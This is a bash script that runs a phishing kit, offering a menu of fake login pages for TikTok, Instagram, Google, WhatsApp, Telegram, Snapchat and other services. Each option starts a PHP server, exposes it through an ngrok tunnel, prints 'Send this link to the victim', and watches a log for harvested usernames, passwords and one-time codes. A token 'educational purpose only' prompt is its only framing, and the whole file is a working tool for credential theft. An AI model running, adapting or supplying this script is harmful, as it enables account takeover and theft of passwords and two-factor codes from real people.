#!/bin/bash
clear
echo ""
echo ""
echo ""
printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON HOTSPOT AND GET START !\e[0m"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m THIS TOOL IS EDUCATIONAL PURPOSE ONLY ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY OPTIONS  \e[0m'
echo ""
echo ""
banner(){
printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Tiktok \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Instagram \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Uber Eats \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Google \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-Followers \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Telegram \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Ajio \e[0m"
printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;93m Exit \e[0m"
printf "\n" 
}
banner
echo ""
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
case $option in

                         1)cd sites/ 
                           cd tiktok/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                           echo ""
                           tail -f log.txt | grep -e "username" -e "otp"

                ;;

                2)cd sites/
                  cd instagram/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt 



                  ;;


                3)cd sites/
                  cd UberEats-Phishing/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"


                  ;;
  

                4)cd sites/
                  cd google-otp/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "password" -e "OTP"


                  ;;
  

                  5)cd sites/
                  cd instafollow/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"


                  ;;


                  6)cd sites/
                  cd whatsapp-phishing/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "number" -e "OTP" -e "otp"


                  ;;


                  7)cd sites/
                  cd telegram/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "phone_number" -e "phone_code"


                  ;;


                  8)cd sites/
                  cd pinterest/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "id" -e "password"


                  ;;


                  9)cd sites/
                  cd snapchat/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "Code"


                  ;;


                  10)cd sites/
                  cd ajio/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING PHP SERVER + \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m ✓ \e[0m\e[1;33m]\e[0m\e[1;32m + STARTING NGROK SERVER + \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m ✓ \e[1;33m] Send this link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m + WAITING +  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password"


                  ;;


                  00)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m                                                         >> THANKS FOR JOIN US >> \e[0m'
                   sleep 1
                   exit
                ;;


                esac
                ;;
